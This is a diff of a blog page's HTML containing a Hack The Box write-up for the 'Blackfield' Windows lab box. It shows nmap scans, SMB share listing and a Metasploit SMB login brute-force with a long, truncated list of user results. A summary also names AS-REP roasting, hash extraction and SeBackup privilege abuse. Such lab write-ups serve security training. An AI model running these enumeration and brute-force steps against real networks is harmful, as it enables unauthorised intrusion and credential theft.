@@ -25,7 +25,7 @@
 
 
 
-<link rel="stylesheet" href="/main.393856bf2c430bb6c01d7af07c6fe966e7cce8073435cfbbc46e590bab7405ef.css">
+<link rel="stylesheet" href="/main.4e5c639214707eff609bb55fe49e183dee42258a73bc90e4cc7b0a84f900798a.css">
 
 
 
@@ -33,16 +33,10 @@
 
 
 <meta itemprop="name" content="Blackfield - Hack The Box">
-<meta itemprop="description" content="Summary Blackfield is hard Windows box. Account enumeration is easy because the box has anonymous access to profiles$ share. That allowed to build custom list for users and find an account with DONT_REQ_PREAUTH flag set: support. The account has policy allowed to change password for non-admin accounts and thus gain access to memory dumps made by audit2020 account. Extracted NTLM hash for svc_backup allowed login to the box and abuse sebackup/serestore to root the domain and then extract administrator ntlm hash from NTDS.">
-<meta itemprop="datePublished" content="2020-06-07T20:02:01+02:00" />
+<meta itemprop="description" content="Summary Blackfield is hard Windows box. Account enumeration is easy because the box has anonymous access to profiles$ share. That allowed to build custom list for users and find an account with DONT_REQ_PREAUTH flag set: support. The account has policy allowed to change password for non-admin accounts and thus gain access to memory dumps made by audit2020 account. Extracted NTLM hash for svc_backup allowed login to the box and abuse sebackup/serestore to root the domain and then extract administrator ntlm hash from NTDS."><meta itemprop="datePublished" content="2020-06-07T20:02:01+02:00" />
 <meta itemprop="dateModified" content="2020-06-07T20:02:01+02:00" />
-<meta itemprop="wordCount" content="9478">
-<meta itemprop="image" content="http://foxmaccloud.com/"/>
-
-
-
+<meta itemprop="wordCount" content="9478"><meta itemprop="image" content="http://foxmaccloud.com/"/>
 <meta itemprop="keywords" content="" />
-
 <meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content="http://foxmaccloud.com/"/>
 
@@ -51,13 +45,14 @@
 
 
 
+
     <meta property="og:title" content="Blackfield - Hack The Box" />
 <meta property="og:description" content="Summary Blackfield is hard Windows box. Account enumeration is easy because the box has anonymous access to profiles$ share. That allowed to build custom list for users and find an account with DONT_REQ_PREAUTH flag set: support. The account has policy allowed to change password for non-admin accounts and thus gain access to memory dumps made by audit2020 account. Extracted NTLM hash for svc_backup allowed login to the box and abuse sebackup/serestore to root the domain and then extract administrator ntlm hash from NTDS." />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="http://foxmaccloud.com/writeups/hackthebox/blackfield/" />
-<meta property="og:image" content="http://foxmaccloud.com/"/>
+<meta property="og:url" content="http://foxmaccloud.com/writeups/hackthebox/blackfield/" /><meta property="og:image" content="http://foxmaccloud.com/"/><meta property="article:section" content="writeups" />
 <meta property="article:published_time" content="2020-06-07T20:02:01+02:00" />
 <meta property="article:modified_time" content="2020-06-07T20:02:01+02:00" /><meta property="og:site_name" content="FoxCorp" />
+
 
 
 
@@ -73,9 +68,14 @@
 
 
 
+
+
     </head>
 
-    <body class="dark-theme">
+    
+        <body>
+    
+    
         <div class="container">
             <header class="header">
     <span class="header__inner">
@@ -97,7 +97,7 @@
         <span class="header__right">
             
                 <nav class="menu">
-    <ul class="menu__inner"><li><a href="http://foxmaccloud.com/posts/">Posts</a></li><li><a href="http://foxmaccloud.com/whoami/">whoami</a></li><li><a href="http://foxmaccloud.com/writeups/">Writeups</a></li>
+    <ul class="menu__inner"><li><a href="/posts/">Posts</a></li><li><a href="/whoami/">whoami</a></li><li><a href="/writeups/">Writeups</a></li>
     </ul>
 </nav>
 
@@ -108,13 +108,6 @@
                     </svg>
                 </span>
             
-
-            <span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
-  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
-  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
-  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
-</svg>
-</span>
         </span>
     </span>
 </header>
@@ -133,7 +126,7 @@
             <h2 class="post-title"><a href="http://foxmaccloud.com/writeups/hackthebox/blackfield/">Blackfield - Hack The Box</a></h2>
 
             
-
+            
             
 
             <div class="post-content">
@@ -146,60 +139,60 @@
 <ul>
 <li>quick summary:</li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nmap -A -T5 -Pn -oN initial-nmap-scan 10.10.10.192
-
-Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2020-06-09 15:00 CEST
-Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.192
-Host is up <span style="color:#f92672">(</span>0.037s latency<span style="color:#f92672">)</span>.
-Not shown: <span style="color:#ae81ff">993</span> filtered ports
-PORT     STATE SERVICE       VERSION
-53/tcp   open  domain?
-| fingerprint-strings:
-|   DNSVersionBindReqTCP:
-|     version
-|_    bind
-88/tcp   open  kerberos-sec  Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2020-06-09 18:01:57Z<span style="color:#f92672">)</span>
-135/tcp  open  msrpc         Microsoft Windows RPC
-389/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: BLACKFIELD.local0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
-445/tcp  open  microsoft-ds?
-593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
-3268/tcp open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: BLACKFIELD.local0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
-<span style="color:#ae81ff">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
-SF-Port53-TCP:V<span style="color:#f92672">=</span>7.80%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>6/9%Time<span style="color:#f92672">=</span>5EDF881A%P<span style="color:#f92672">=</span>x86_64-unknown-linux-gnu%r<span style="color:#f92672">(</span>
-SF:DNSVersionBindReqTCP,20,<span style="color:#e6db74">&#34;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07vers
-</span><span style="color:#e6db74">SF:ion\x04bind\0\0\x10\0\x03&#34;</span><span style="color:#f92672">)</span>;
-Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
-
-Host script results:
-|_clock-skew: 5h00m46s
-| smb2-security-mode:
-|   2.02:
-|_    Message signing enabled and required
-| smb2-time:
-|   date: 2020-06-09T18:04:14
-|_  start_date: N/A
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 188.57 seconds                                  
-</code></pre></div><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -A -T5 -Pn -oN initial-nmap-scan 10.10.10.192
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2020-06-09 15:00 CEST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.192
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.037s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">993</span> filtered ports
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE       VERSION
+</span></span><span style="display:flex;"><span>53/tcp   open  domain?
+</span></span><span style="display:flex;"><span>| fingerprint-strings:
+</span></span><span style="display:flex;"><span>|   DNSVersionBindReqTCP:
+</span></span><span style="display:flex;"><span>|     version
+</span></span><span style="display:flex;"><span>|_    bind
+</span></span><span style="display:flex;"><span>88/tcp   open  kerberos-sec  Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2020-06-09 18:01:57Z<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>135/tcp  open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>389/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: BLACKFIELD.local0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>445/tcp  open  microsoft-ds?
+</span></span><span style="display:flex;"><span>593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>3268/tcp open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: BLACKFIELD.local0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span><span style="display:flex;"><span>SF-Port53-TCP:V<span style="color:#f92672">=</span>7.80%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>6/9%Time<span style="color:#f92672">=</span>5EDF881A%P<span style="color:#f92672">=</span>x86_64-unknown-linux-gnu%r<span style="color:#f92672">(</span>
+</span></span><span style="display:flex;"><span>SF:DNSVersionBindReqTCP,20,<span style="color:#e6db74">&#34;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07vers
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:ion\x04bind\0\0\x10\0\x03&#34;</span><span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>|_clock-skew: 5h00m46s
+</span></span><span style="display:flex;"><span>| smb2-security-mode:
+</span></span><span style="display:flex;"><span>|   2.02:
+</span></span><span style="display:flex;"><span>|_    Message signing enabled and required
+</span></span><span style="display:flex;"><span>| smb2-time:
+</span></span><span style="display:flex;"><span>|   date: 2020-06-09T18:04:14
+</span></span><span style="display:flex;"><span>|_  start_date: N/A
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 188.57 seconds                                  
+</span></span></code></pre></div><ul>
 <li>UDP ports:</li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nmap -A -T5 -Pn -sUV -p <span style="color:#ae81ff">100</span> -oN initial-UDP-nmap-scan 10.10.10.192
-
-Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2020-06-09 15:53 CEST
-Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.192
-Host is up.
-
-PORT    STATE         SERVICE VERSION
-100/udp open|filtered unknown
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 99.45 seconds
-</code></pre></div><ol start="2">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -A -T5 -Pn -sUV -p <span style="color:#ae81ff">100</span> -oN initial-UDP-nmap-scan 10.10.10.192
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2020-06-09 15:53 CEST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.192
+</span></span><span style="display:flex;"><span>Host is up.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT    STATE         SERVICE VERSION
+</span></span><span style="display:flex;"><span>100/udp open|filtered unknown
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 99.45 seconds
+</span></span></code></pre></div><ol start="2">
 <li>SMB listing:</li>
 </ol>
-<pre><code>smbclient -L //10.10.10.192
-Enter WORKGROUP\foxmaccloud's password:
+<pre tabindex="0"><code>smbclient -L //10.10.10.192
+Enter WORKGROUP\foxmaccloud&#39;s password:
 
 	Sharename       Type      Comment
 	---------       ----      -------
@@ -211,9 +204,9 @@ Enter WORKGROUP\foxmaccloud's password:
 	profiles$       Disk      
 	SYSVOL          Disk      Logon server share
 SMB1 disabled -- no workgroup available
-</code></pre><pre><code>smbclient //10.10.10.192/profiles$
-Enter WORKGROUP\foxmaccloud's password:
-Try &quot;help&quot; to get a list of possible commands.
+</code></pre><pre tabindex="0"><code>smbclient //10.10.10.192/profiles$
+Enter WORKGROUP\foxmaccloud&#39;s password:
+Try &#34;help&#34; to get a list of possible commands.
 smb: \&gt; ls
   .                                   D        0  Wed Jun  3 18:47:12 2020
   ..                                  D        0  Wed Jun  3 18:47:12 2020
@@ -537,7 +530,7 @@ smb: \&gt;
 </code></pre><ol start="3">
 <li>Save these profiles to <code>users.txt</code> file. I&rsquo;m gonna use metasploit and run a SMB login scan.</li>
 </ol>
-<pre><code>msf5 auxiliary(scanner/smb/smb_login) &gt; use scanner/smb/smb_login
+<pre tabindex="0"><code>msf5 auxiliary(scanner/smb/smb_login) &gt; use scanner/smb/smb_login
 msf5 auxiliary(scanner/smb/smb_login) &gt; show options
 
 Module options (auxiliary/scanner/smb/smb_login):
@@ -556,7 +549,7 @@ Module options (auxiliary/scanner/smb/smb_login):
    PRESERVE_DOMAINS   true             no        Respect a username that contains a domain name.
    Proxies                             no        A proxy chain of format type:host:port[,type:host:port][...]
    RECORD_GUEST       false            no        Record guest-privileged random logins to the database
-   RHOSTS             10.10.10.192     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'
+   RHOSTS             10.10.10.192     yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;
    RPORT              445              yes       The SMB service port (TCP)
    SMBDomain          .                no        The Windows domain to use for authentication
    SMBPass                             no        The password for the specified username
@@ -575,367 +568,366 @@ BLANK_PASSWORDS =&gt; true
 msf5 auxiliary(scanner/smb/smb_login) &gt; run
 
 [*] 10.10.10.192:445      - 10.10.10.192:445 - Starting SMB login bruteforce
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\AAlleni:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\AAlleni:&#39;
 [!] 10.10.10.192:445      - No active DB -- Credential data will not be saved!
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\ABarteski:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\ABekesz:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\ABenzies:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\ABiemiller:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\AChampken:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\ACheretei:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\ACsonaki:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\AHigchens:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\AJaquemai:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\AKlado:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\AKoffenburger:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\AKollolli:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\AKruppe:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\AKubale:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\ALamerz:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\AMaceldon:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\AMasalunga:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\ANavay:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\ANesterova:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\ANeusse:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\AOkleshen:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\APustulka:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\ARotella:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\ASanwardeker:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\AShadaia:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\ASischo:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\ASpruce:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\ATakach:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\ATaueg:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\ATwardowski:'
-[-] 10.10.10.192:445      - 10.10.10.192:445 - Failed: '.\audit2020:',
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\AWangenheim:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\AWorsey:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\AZigmunt:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\BBakajza:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\BBeloucif:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\BCarmitcheal:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\BConsultant:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\BErdossy:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\BGeminski:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\BLostal:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\BMannise:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\BNovrotsky:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\BRigiero:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\BSamkoses:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\BZandonella:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\CAcherman:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\CAkbari:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\CAldhowaihi:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\CArgyropolous:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\CDufrasne:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\CGronk:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\Chiucarello:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\Chiuccariello:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\CHoytal:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\CKijauskas:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\CKolbo:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\CMakutenas:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\CMorcillo:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\CSchandall:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\CSelters:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\CTolmie:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\DCecere:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\DChintalapalli:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\DCwilich:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\DGarbatiuc:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\DKemesies:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\DMatuka:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\DMedeme:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\DMeherek:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\DMetych:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\DPaskalev:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\DPriporov:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\DRusanovskaya:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\DVellela:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\DVogleson:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\DZwinak:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\EBoley:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\EEulau:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\EFeatherling:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\EFrixione:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\EJenorik:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\EKmilanovic:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\ElKatkowsky:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\EmaCaratenuto:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\EPalislamovic:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\EPryar:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\ESachhitello:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\ESariotti:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\ETurgano:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\EWojtila:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\FAlirezai:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\FBaldwind:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\FBroj:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\FDeblaquire:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\FDegeorgio:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\FianLaginja:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\FLasokowski:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\FPflum:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\FReffey:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\GaBelithe:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\Gareld:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\GBatowski:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\GForshalger:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\GGomane:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\GHisek:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\GMaroufkhani:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\GMerewether:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\GQuinniey:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\GRoswurm:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\GWiegard:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\HBlaziewske:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\HColantino:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\HConforto:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\HCunnally:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\HGougen:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\HKostova:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\IChristijr:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\IKoledo:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\IKotecky:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\ISantosi:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\JAngvall:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\JBehmoiras:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\JDanten:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\JDjouka:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\JKondziola:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\JLeytushsenior:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\JLuthner:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\JMoorehendrickson:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\JPistachio:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\JScima:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\JSebaali:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\JShoenherr:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\JShuselvt:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\KAmavisca:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\KAtolikian:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\KBrokinn:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\KCockeril:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\KColtart:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\KCyster:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\KDorney:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\KKoesno:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\KLangfur:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\KMahalik:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\KMasloch:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\KMibach:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\KParvankova:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\KPregnolato:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\KRasmor:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\KShievitz:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\KSojdelius:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\KTambourgi:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\KVlahopoulos:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\KZyballa:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\LBajewsky:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\LBaligand:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\LBarhamand:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\LBirer:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\LBobelis:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\LChippel:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\LChoffin:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\LCominelli:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\LDruge:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\LEzepek:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\LHyungkim:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\LKarabag:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\LKirousis:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\LKnade:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\LKrioua:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\LLefebvre:'
-[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\LLoeradeavilez:'
